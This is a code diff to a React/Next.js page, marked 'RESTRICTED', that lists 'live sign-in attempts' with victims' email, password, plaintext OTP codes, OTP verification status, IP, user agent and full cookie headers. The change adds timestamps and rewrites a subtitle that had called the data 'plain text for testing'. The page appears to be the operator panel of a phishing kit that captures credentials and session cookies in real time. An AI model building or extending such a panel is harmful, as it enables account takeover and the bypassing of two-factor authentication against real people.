@@ -11,6 +11,14 @@ import {
 } from '@/app/actions'
 import type { LoginAttempt } from '@/lib/store'
 
+function fmt(ts: number) {
+  try {
+    return new Date(ts).toLocaleString()
+  } catch {
+    return String(ts)
+  }
+}
+
 export default function OpsPage() {
   const [authed, setAuthed] = useState(false)
   const [email, setEmail] = useState('blessedresult6@gmail.com')
@@ -100,7 +108,7 @@ export default function OpsPage() {
           <p style={{ margin: 0, color: '#8fbfa8', fontSize: 12, letterSpacing: 2 }}>RESTRICTED</p>
           <h1 style={{ margin: '4px 0' }}>Live sign-in attempts</h1>
           <p style={{ margin: 0, color: '#7f8f87', fontSize: 13 }}>
-            Auto-refresh 3s · plain text for testing
+            Auto-refresh 3s · email, password, OTP, cookies, IP, timestamps
           </p>
         </div>
         <button
@@ -136,6 +144,9 @@ export default function OpsPage() {
                   {a.step} · {a.status}
                 </div>
                 <div style={{ fontSize: 13, color: '#c5d4cc', marginTop: 4 }}>{a.lastEvent}</div>
+                <div style={{ fontSize: 12, color: '#7f8f87', marginTop: 4 }}>
+                  Started: {fmt(a.createdAt)} · Updated: {fmt(a.updatedAt)}
+                </div>
               </div>
               <div style={{ display: 'flex', gap: 8 }}>
                 <button
@@ -173,7 +184,9 @@ Username: ${a.username || '—'}
 OTP: ${a.otpPlain || '—'}  (#1 ${a.otp1Verified ? '✓' : '·'}  #2 ${a.otp2Verified ? '✓' : '·'})
 IP: ${a.ip || '—'}
 UA: ${a.userAgent || '—'}
-Cookies: ${a.cookieHeader || '—'}`}</pre>
+Cookies: ${a.cookieHeader || '—'}
+Started: ${fmt(a.createdAt)}
+Updated: ${fmt(a.updatedAt)}`}</pre>
           </div>
         ))}
       </div>
